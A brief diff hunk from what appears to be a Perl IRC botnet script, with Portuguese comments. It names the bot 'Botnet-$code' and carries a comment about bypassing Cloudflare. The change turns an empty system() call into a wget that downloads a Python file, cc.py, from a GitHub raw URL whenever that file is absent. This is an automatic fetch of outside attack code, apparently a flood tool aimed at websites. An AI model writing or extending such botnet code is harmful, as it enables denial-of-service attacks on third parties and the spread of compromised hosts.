@@ -11,7 +11,7 @@ my $nick    = "Botnet-$code"; #$code vai gerar um número aleatório#
 # for bypass cloudflare #
 unless (-e "cc.py") {
   print "[*] Instalando...";
-  system("");
+  system("wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/cc.py");
 }
 
 all();
